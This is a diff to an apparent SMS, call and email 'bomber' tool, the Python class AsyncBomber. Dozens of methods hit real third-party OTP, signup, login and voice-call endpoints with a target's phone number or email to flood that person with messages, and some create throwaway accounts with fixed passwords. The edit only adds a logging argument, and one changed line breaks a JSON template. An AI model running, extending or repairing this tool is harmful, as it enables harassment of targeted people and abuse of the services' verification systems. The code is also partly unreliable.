@@ -984,10 +988,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL34 - Extra API 34", success, res.status)
+                await self.log_event("CALL34 - Extra API 34", success, res.status, api_key="CALL34 - Extra API 34")
                 return success
         except Exception:
-            await self.log_event("CALL34 - Extra API 34", False, "Error")
+            await self.log_event("CALL34 - Extra API 34", False, "Error", api_key="CALL34 - Extra API 34")
             return False
 
     async def api_call35___extra_call_api_35(self):
@@ -1008,10 +1012,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL35 - Extra API 35", success, res.status)
+                await self.log_event("CALL35 - Extra API 35", success, res.status, api_key="CALL35 - Extra API 35")
                 return success
         except Exception:
-            await self.log_event("CALL35 - Extra API 35", False, "Error")
+            await self.log_event("CALL35 - Extra API 35", False, "Error", api_key="CALL35 - Extra API 35")
             return False
 
     async def api_call36___extra_call_api_36(self):
@@ -1032,10 +1036,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL36 - Extra API 36", success, res.status)
+                await self.log_event("CALL36 - Extra API 36", success, res.status, api_key="CALL36 - Extra API 36")
                 return success
         except Exception:
-            await self.log_event("CALL36 - Extra API 36", False, "Error")
+            await self.log_event("CALL36 - Extra API 36", False, "Error", api_key="CALL36 - Extra API 36")
             return False
 
     async def api_call37___extra_call_api_37(self):
@@ -1056,10 +1060,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL37 - Extra API 37", success, res.status)
+                await self.log_event("CALL37 - Extra API 37", success, res.status, api_key="CALL37 - Extra API 37")
                 return success
         except Exception:
-            await self.log_event("CALL37 - Extra API 37", False, "Error")
+            await self.log_event("CALL37 - Extra API 37", False, "Error", api_key="CALL37 - Extra API 37")
             return False
 
     async def api_call38___extra_call_api_38(self):
@@ -1080,10 +1084,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL38 - Extra API 38", success, res.status)
+                await self.log_event("CALL38 - Extra API 38", success, res.status, api_key="CALL38 - Extra API 38")
                 return success
         except Exception:
-            await self.log_event("CALL38 - Extra API 38", False, "Error")
+            await self.log_event("CALL38 - Extra API 38", False, "Error", api_key="CALL38 - Extra API 38")
             return False
 
     async def api_call39___extra_call_api_39(self):
@@ -1104,10 +1108,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL39 - Extra API 39", success, res.status)
+                await self.log_event("CALL39 - Extra API 39", success, res.status, api_key="CALL39 - Extra API 39")
                 return success
         except Exception:
-            await self.log_event("CALL39 - Extra API 39", False, "Error")
+            await self.log_event("CALL39 - Extra API 39", False, "Error", api_key="CALL39 - Extra API 39")
             return False
 
     async def api_call40___extra_call_api_40(self):
@@ -1128,10 +1132,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL40 - Extra API 40", success, res.status)
+                await self.log_event("CALL40 - Extra API 40", success, res.status, api_key="CALL40 - Extra API 40")
                 return success
         except Exception:
-            await self.log_event("CALL40 - Extra API 40", False, "Error")
+            await self.log_event("CALL40 - Extra API 40", False, "Error", api_key="CALL40 - Extra API 40")
             return False
 
     async def api_call41___extra_call_api_41(self):
@@ -1152,10 +1156,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL41 - Extra API 41", success, res.status)
+                await self.log_event("CALL41 - Extra API 41", success, res.status, api_key="CALL41 - Extra API 41")
                 return success
         except Exception:
-            await self.log_event("CALL41 - Extra API 41", False, "Error")
+            await self.log_event("CALL41 - Extra API 41", False, "Error", api_key="CALL41 - Extra API 41")
             return False
 
     async def api_call42___extra_call_api_42(self):
@@ -1176,10 +1180,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL42 - Extra API 42", success, res.status)
+                await self.log_event("CALL42 - Extra API 42", success, res.status, api_key="CALL42 - Extra API 42")
                 return success
         except Exception:
-            await self.log_event("CALL42 - Extra API 42", False, "Error")
+            await self.log_event("CALL42 - Extra API 42", False, "Error", api_key="CALL42 - Extra API 42")
             return False
 
     async def api_call43___extra_call_api_43(self):
@@ -1200,10 +1204,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL43 - Extra API 43", success, res.status)
+                await self.log_event("CALL43 - Extra API 43", success, res.status, api_key="CALL43 - Extra API 43")
                 return success
         except Exception:
-            await self.log_event("CALL43 - Extra API 43", False, "Error")
+            await self.log_event("CALL43 - Extra API 43", False, "Error", api_key="CALL43 - Extra API 43")
             return False
 
     async def api_call44___extra_call_api_44(self):
@@ -1224,10 +1228,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL44 - Extra API 44", success, res.status)
+                await self.log_event("CALL44 - Extra API 44", success, res.status, api_key="CALL44 - Extra API 44")
                 return success
         except Exception:
-            await self.log_event("CALL44 - Extra API 44", False, "Error")
+            await self.log_event("CALL44 - Extra API 44", False, "Error", api_key="CALL44 - Extra API 44")
             return False
 
     async def api_call45___extra_call_api_45(self):
@@ -1248,10 +1252,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL45 - Extra API 45", success, res.status)
+                await self.log_event("CALL45 - Extra API 45", success, res.status, api_key="CALL45 - Extra API 45")
                 return success
         except Exception:
-            await self.log_event("CALL45 - Extra API 45", False, "Error")
+            await self.log_event("CALL45 - Extra API 45", False, "Error", api_key="CALL45 - Extra API 45")
             return False
 
     async def api_call46___extra_call_api_46(self):
@@ -1272,10 +1276,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL46 - Extra API 46", success, res.status)
+                await self.log_event("CALL46 - Extra API 46", success, res.status, api_key="CALL46 - Extra API 46")
                 return success
         except Exception:
-            await self.log_event("CALL46 - Extra API 46", False, "Error")
+            await self.log_event("CALL46 - Extra API 46", False, "Error", api_key="CALL46 - Extra API 46")
             return False
 
     async def api_call47___extra_call_api_47(self):
@@ -1296,10 +1300,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL47 - Extra API 47", success, res.status)
+                await self.log_event("CALL47 - Extra API 47", success, res.status, api_key="CALL47 - Extra API 47")
                 return success
         except Exception:
-            await self.log_event("CALL47 - Extra API 47", False, "Error")
+            await self.log_event("CALL47 - Extra API 47", False, "Error", api_key="CALL47 - Extra API 47")
             return False
 
     async def api_call48___extra_call_api_48(self):
@@ -1320,10 +1324,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL48 - Extra API 48", success, res.status)
+                await self.log_event("CALL48 - Extra API 48", success, res.status, api_key="CALL48 - Extra API 48")
                 return success
         except Exception:
-            await self.log_event("CALL48 - Extra API 48", False, "Error")
+            await self.log_event("CALL48 - Extra API 48", False, "Error", api_key="CALL48 - Extra API 48")
             return False
 
     async def api_call49___extra_call_api_49(self):
@@ -1344,10 +1348,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL49 - Extra API 49", success, res.status)
+                await self.log_event("CALL49 - Extra API 49", success, res.status, api_key="CALL49 - Extra API 49")
                 return success
         except Exception:
-            await self.log_event("CALL49 - Extra API 49", False, "Error")
+            await self.log_event("CALL49 - Extra API 49", False, "Error", api_key="CALL49 - Extra API 49")
             return False
 
     async def api_call50___extra_call_api_50(self):
@@ -1368,10 +1372,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL50 - Extra API 50", success, res.status)
+                await self.log_event("CALL50 - Extra API 50", success, res.status, api_key="CALL50 - Extra API 50")
                 return success
         except Exception:
-            await self.log_event("CALL50 - Extra API 50", False, "Error")
+            await self.log_event("CALL50 - Extra API 50", False, "Error", api_key="CALL50 - Extra API 50")
             return False
 
     async def api_call51___extra_call_api_51(self):
@@ -1392,10 +1396,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL51 - Extra API 51", success, res.status)
+                await self.log_event("CALL51 - Extra API 51", success, res.status, api_key="CALL51 - Extra API 51")
                 return success
         except Exception:
-            await self.log_event("CALL51 - Extra API 51", False, "Error")
+            await self.log_event("CALL51 - Extra API 51", False, "Error", api_key="CALL51 - Extra API 51")
             return False
 
     async def api_call52___extra_call_api_52(self):
@@ -1416,10 +1420,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL52 - Extra API 52", success, res.status)
+                await self.log_event("CALL52 - Extra API 52", success, res.status, api_key="CALL52 - Extra API 52")
                 return success
         except Exception:
-            await self.log_event("CALL52 - Extra API 52", False, "Error")
+            await self.log_event("CALL52 - Extra API 52", False, "Error", api_key="CALL52 - Extra API 52")
             return False
 
     async def api_call53___extra_call_api_53(self):
@@ -1440,10 +1444,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL53 - Extra API 53", success, res.status)
+                await self.log_event("CALL53 - Extra API 53", success, res.status, api_key="CALL53 - Extra API 53")
                 return success
         except Exception:
-            await self.log_event("CALL53 - Extra API 53", False, "Error")
+            await self.log_event("CALL53 - Extra API 53", False, "Error", api_key="CALL53 - Extra API 53")
             return False
 
     async def api_call54___extra_call_api_54(self):
@@ -1464,10 +1468,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL54 - Extra API 54", success, res.status)
+                await self.log_event("CALL54 - Extra API 54", success, res.status, api_key="CALL54 - Extra API 54")
                 return success
         except Exception:
-            await self.log_event("CALL54 - Extra API 54", False, "Error")
+            await self.log_event("CALL54 - Extra API 54", False, "Error", api_key="CALL54 - Extra API 54")
             return False
 
     async def api_call55___extra_call_api_55(self):
@@ -1488,10 +1492,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL55 - Extra API 55", success, res.status)
+                await self.log_event("CALL55 - Extra API 55", success, res.status, api_key="CALL55 - Extra API 55")
                 return success
         except Exception:
-            await self.log_event("CALL55 - Extra API 55", False, "Error")
+            await self.log_event("CALL55 - Extra API 55", False, "Error", api_key="CALL55 - Extra API 55")
             return False
 
     async def api_call56___extra_call_api_56(self):
@@ -1512,10 +1516,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL56 - Extra API 56", success, res.status)
+                await self.log_event("CALL56 - Extra API 56", success, res.status, api_key="CALL56 - Extra API 56")
                 return success
         except Exception:
-            await self.log_event("CALL56 - Extra API 56", False, "Error")
+            await self.log_event("CALL56 - Extra API 56", False, "Error", api_key="CALL56 - Extra API 56")
             return False
 
     async def api_call57___extra_call_api_57(self):
@@ -1536,10 +1540,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL57 - Extra API 57", success, res.status)
+                await self.log_event("CALL57 - Extra API 57", success, res.status, api_key="CALL57 - Extra API 57")
                 return success
         except Exception:
-            await self.log_event("CALL57 - Extra API 57", False, "Error")
+            await self.log_event("CALL57 - Extra API 57", False, "Error", api_key="CALL57 - Extra API 57")
             return False
 
     async def api_call58___extra_call_api_58(self):
@@ -1560,10 +1564,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL58 - Extra API 58", success, res.status)
+                await self.log_event("CALL58 - Extra API 58", success, res.status, api_key="CALL58 - Extra API 58")
                 return success
         except Exception:
-            await self.log_event("CALL58 - Extra API 58", False, "Error")
+            await self.log_event("CALL58 - Extra API 58", False, "Error", api_key="CALL58 - Extra API 58")
             return False
 
     async def api_call59___extra_call_api_59(self):
@@ -1584,10 +1588,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL59 - Extra API 59", success, res.status)
+                await self.log_event("CALL59 - Extra API 59", success, res.status, api_key="CALL59 - Extra API 59")
                 return success
         except Exception:
-            await self.log_event("CALL59 - Extra API 59", False, "Error")
+            await self.log_event("CALL59 - Extra API 59", False, "Error", api_key="CALL59 - Extra API 59")
             return False
 
     async def api_call60___extra_call_api_60(self):
@@ -1608,10 +1612,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL60 - Extra API 60", success, res.status)
+                await self.log_event("CALL60 - Extra API 60", success, res.status, api_key="CALL60 - Extra API 60")
                 return success
         except Exception:
-            await self.log_event("CALL60 - Extra API 60", False, "Error")
+            await self.log_event("CALL60 - Extra API 60", False, "Error", api_key="CALL60 - Extra API 60")
             return False
 
     async def api_call61___extra_call_api_61(self):
@@ -1632,10 +1636,10 @@ class AsyncBomber:
             payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
             async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("CALL61 - Extra API 61", success, res.status)
+                await self.log_event("CALL61 - Extra API 61", success, res.status, api_key="CALL61 - Extra API 61")
                 return success
         except Exception:
-            await self.log_event("CALL61 - Extra API 61", False, "Error")
+            await self.log_event("CALL61 - Extra API 61", False, "Error", api_key="CALL61 - Extra API 61")
             return False
 
     async def api_email49___quora_signup(self):
@@ -1644,10 +1648,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={"email": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201, 403]
-                await self.log_event("EMAIL49 - Quora Signup", success, res.status)
+                await self.log_event("EMAIL49 - Quora Signup", success, res.status, api_key="EMAIL49 - Quora Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL49 - Quora Signup", False, "Error")
+            await self.log_event("EMAIL49 - Quora Signup", False, "Error", api_key="EMAIL49 - Quora Signup")
             return False
 
     async def api_email50___pinterest_signup(self):
@@ -1656,10 +1660,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={"email": target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("EMAIL50 - Pinterest Signup", success, res.status)
+                await self.log_event("EMAIL50 - Pinterest Signup", success, res.status, api_key="EMAIL50 - Pinterest Signup")
                 return success
         except Exception:
-            await self.log_event("EMAIL50 - Pinterest Signup", False, "Error")
+            await self.log_event("EMAIL50 - Pinterest Signup", False, "Error", api_key="EMAIL50 - Pinterest Signup")
             return False
 
     async def api_api1___redx_signup(self):
@@ -1668,10 +1672,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"phone":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API1 - RedX Signup", success, res.status)
+                await self.log_event("API1 - RedX Signup", success, res.status, api_key="API1 - RedX Signup")
                 return success
         except Exception:
-            await self.log_event("API1 - RedX Signup", False, "Error")
+            await self.log_event("API1 - RedX Signup", False, "Error", api_key="API1 - RedX Signup")
             return False
 
 
@@ -1681,10 +1685,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API2 - KhaasFood OTP", success, res.status)
+                await self.log_event("API2 - KhaasFood OTP", success, res.status, api_key="API2 - KhaasFood OTP")
                 return success
         except Exception:
-            await self.log_event("API2 - KhaasFood OTP", False, "Error")
+            await self.log_event("API2 - KhaasFood OTP", False, "Error", api_key="API2 - KhaasFood OTP")
             return False
 
 
@@ -1694,10 +1698,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API3 - Bioscope Login", success, res.status)
+                await self.log_event("API3 - Bioscope Login", success, res.status, api_key="API3 - Bioscope Login")
                 return success
         except Exception:
-            await self.log_event("API3 - Bioscope Login", False, "Error")
+            await self.log_event("API3 - Bioscope Login", False, "Error", api_key="API3 - Bioscope Login")
             return False
 
 
@@ -1707,10 +1711,10 @@ class AsyncBomber:
         try:
             async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API4 - Bikroy Phone Login", success, res.status)
+                await self.log_event("API4 - Bikroy Phone Login", success, res.status, api_key="API4 - Bikroy Phone Login")
                 return success
         except Exception:
-            await self.log_event("API4 - Bikroy Phone Login", False, "Error")
+            await self.log_event("API4 - Bikroy Phone Login", False, "Error", api_key="API4 - Bikroy Phone Login")
             return False
 
 
@@ -1718,12 +1722,12 @@ class AsyncBomber:
         target = self.target
         url = f"https://billing.proiojon.com/api/v1/auth/sign-up".replace("{phone}", target)
         try:
-            async with self.session.post(url, json=json.loads('{"name":"{randomName}","phone":"{phone}","email":"{randomEmail}","password":"password123","ref_code":""}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
+            async with self.session.post(url, json=json.loads('{"name":"{randomName}","phone":"{phone}","email":"{randomEmail}","password":"password123","ref_code":"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API5 - Proiojon Signup", success, res.status)
+                await self.log_event("API5 - Proiojon Signup", success, res.status, api_key="API5 - Proiojon Signup")
                 return success
         except Exception:
-            await self.log_event("API5 - Proiojon Signup", False, "Error")
+            await self.log_event("API5 - Proiojon Signup", False, "Error", api_key="API5 - Proiojon Signup")
             return False
 
 
@@ -1733,10 +1737,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API6 - BeautyBooth Signup", success, res.status)
+                await self.log_event("API6 - BeautyBooth Signup", success, res.status, api_key="API6 - BeautyBooth Signup")
                 return success
         except Exception:
-            await self.log_event("API6 - BeautyBooth Signup", False, "Error")
+            await self.log_event("API6 - BeautyBooth Signup", False, "Error", api_key="API6 - BeautyBooth Signup")
             return False
 
 
@@ -1746,10 +1750,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API7 - Medha OTP", success, res.status)
+                await self.log_event("API7 - Medha OTP", success, res.status, api_key="API7 - Medha OTP")
                 return success
         except Exception:
-            await self.log_event("API7 - Medha OTP", False, "Error")
+            await self.log_event("API7 - Medha OTP", False, "Error", api_key="API7 - Medha OTP")
             return False
 
 
@@ -1759,10 +1763,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API8 - Deeptoplay Login", success, res.status)
+                await self.log_event("API8 - Deeptoplay Login", success, res.status, api_key="API8 - Deeptoplay Login")
                 return success
         except Exception:
-            await self.log_event("API8 - Deeptoplay Login", False, "Error")
+            await self.log_event("API8 - Deeptoplay Login", False, "Error", api_key="API8 - Deeptoplay Login")
             return False
 
 
@@ -1772,10 +1776,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API9 - Robi OTP", success, res.status)
+                await self.log_event("API9 - Robi OTP", success, res.status, api_key="API9 - Robi OTP")
                 return success
         except Exception:
-            await self.log_event("API9 - Robi OTP", False, "Error")
+            await self.log_event("API9 - Robi OTP", False, "Error", api_key="API9 - Robi OTP")
             return False
 
 
@@ -1785,10 +1789,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API10 - Arogga SMS", success, res.status)
+                await self.log_event("API10 - Arogga SMS", success, res.status, api_key="API10 - Arogga SMS")
                 return success
         except Exception:
-            await self.log_event("API10 - Arogga SMS", False, "Error")
+            await self.log_event("API10 - Arogga SMS", False, "Error", api_key="API10 - Arogga SMS")
             return False
 
 
@@ -1798,10 +1802,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API11 - MyGP OTP", success, res.status)
+                await self.log_event("API11 - MyGP OTP", success, res.status, api_key="API11 - MyGP OTP")
                 return success
         except Exception:
-            await self.log_event("API11 - MyGP OTP", False, "Error")
+            await self.log_event("API11 - MyGP OTP", False, "Error", api_key="API11 - MyGP OTP")
             return False
 
 
@@ -1811,10 +1815,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API12 - BDSTall OTP", success, res.status)
+                await self.log_event("API12 - BDSTall OTP", success, res.status, api_key="API12 - BDSTall OTP")
                 return success
         except Exception:
-            await self.log_event("API12 - BDSTall OTP", False, "Error")
+            await self.log_event("API12 - BDSTall OTP", False, "Error", api_key="API12 - BDSTall OTP")
             return False
 
 
@@ -1824,10 +1828,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API13 - BCS Exam OTP", success, res.status)
+                await self.log_event("API13 - BCS Exam OTP", success, res.status, api_key="API13 - BCS Exam OTP")
                 return success
         except Exception:
-            await self.log_event("API13 - BCS Exam OTP", False, "Error")
+            await self.log_event("API13 - BCS Exam OTP", False, "Error", api_key="API13 - BCS Exam OTP")
             return False
 
 
@@ -1837,10 +1841,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API14 - DoctorLive OTP", success, res.status)
+                await self.log_event("API14 - DoctorLive OTP", success, res.status, api_key="API14 - DoctorLive OTP")
                 return success
         except Exception:
-            await self.log_event("API14 - DoctorLive OTP", False, "Error")
+            await self.log_event("API14 - DoctorLive OTP", False, "Error", api_key="API14 - DoctorLive OTP")
             return False
 
 
@@ -1850,10 +1854,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{token}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API15 - Sheba OTP", success, res.status)
+                await self.log_event("API15 - Sheba OTP", success, res.status, api_key="API15 - Sheba OTP")
                 return success
         except Exception:
-            await self.log_event("API15 - Sheba OTP", False, "Error")
+            await self.log_event("API15 - Sheba OTP", False, "Error", api_key="API15 - Sheba OTP")
             return False
 
 
@@ -1863,10 +1867,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API16 - Apex4U Login", success, res.status)
+                await self.log_event("API16 - Apex4U Login", success, res.status, api_key="API16 - Apex4U Login")
                 return success
         except Exception:
-            await self.log_event("API16 - Apex4U Login", False, "Error")
+            await self.log_event("API16 - Apex4U Login", False, "Error", api_key="API16 - Apex4U Login")
             return False
 
 
@@ -1876,10 +1880,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API17 - Sindabad OTP", success, res.status)
+                await self.log_event("API17 - Sindabad OTP", success, res.status, api_key="API17 - Sindabad OTP")
                 return success
         except Exception:
-            await self.log_event("API17 - Sindabad OTP", False, "Error")
+            await self.log_event("API17 - Sindabad OTP", False, "Error", api_key="API17 - Sindabad OTP")
             return False
 
 
@@ -1889,10 +1893,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API18 - Kirei OTP", success, res.status)
+                await self.log_event("API18 - Kirei OTP", success, res.status, api_key="API18 - Kirei OTP")
                 return success
         except Exception:
-            await self.log_event("API18 - Kirei OTP", False, "Error")
+            await self.log_event("API18 - Kirei OTP", False, "Error", api_key="API18 - Kirei OTP")
             return False
 
 
@@ -1902,10 +1906,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API19 - Shikho SMS", success, res.status)
+                await self.log_event("API19 - Shikho SMS", success, res.status, api_key="API19 - Shikho SMS")
                 return success
         except Exception:
-            await self.log_event("API19 - Shikho SMS", False, "Error")
+            await self.log_event("API19 - Shikho SMS", False, "Error", api_key="API19 - Shikho SMS")
             return False
 
 
@@ -1915,10 +1919,10 @@ class AsyncBomber:
         try:
             async with self.session.post(url, json=json.loads('{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                 success = res.status in [200, 201]
-                await self.log_event("API20 - Circle Signup", success, res.status)
